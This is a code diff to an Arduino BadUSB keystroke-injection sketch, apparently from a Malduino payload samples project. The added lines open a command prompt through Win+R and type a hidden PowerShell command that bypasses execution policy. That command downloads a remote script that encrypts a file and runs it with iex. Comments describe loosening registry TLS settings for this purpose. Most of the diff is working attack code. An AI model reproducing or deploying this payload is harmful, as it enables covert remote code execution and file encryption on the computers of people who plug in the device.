@@ -23,24 +23,33 @@ void typeKey(int key) {
 }
 
 void setup() {
-  delay(10000);             // extra 10s to help uploading new firmware
   pinMode(ledPin, OUTPUT);
   digitalWrite(ledPin, HIGH);
-
+  delay(1000);
+  digitalWrite(ledPin, LOW);
+  delay(1000);
+  digitalWrite(ledPin, HIGH);
+  delay(1000);
+  digitalWrite(ledPin, LOW);
+  delay(10000);             // extra 10s to help uploading new firmware
   Keyboard.begin();
   Mouse.begin();
 
   /* ----- Begin-Payload -----*/
   delay(1000);            // extra 1s delay, can be adjusted if needed
-
-  delay(defaultDelay);
-  Keyboard.print("d:");   // change the drive letter here
-
-  delay(defaultDelay);
-  delay(300);
-
-  delay(defaultDelay);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("cmd");
+  delay(500);
   typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.print("h:");   // change the drive letter here
+  delay(1000);
+  typeKey(KEY_RETURN);
+  delay(1000);
 
   // change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url
   delay(defaultDelay);
@@ -91,8 +100,8 @@ void setup() {
   // or
   // single_file_ren.ps1 just to rename the file test.txt to test.txt.ren
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex\"");
-  // Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_ren.ps1') | iex\"");
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"set $showscreen='show'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex\"");
+  // Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"set $showscreen='noscreen'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_ren.ps1') | iex\"");
 
   delay(defaultDelay);
   typeKey(KEY_RETURN);
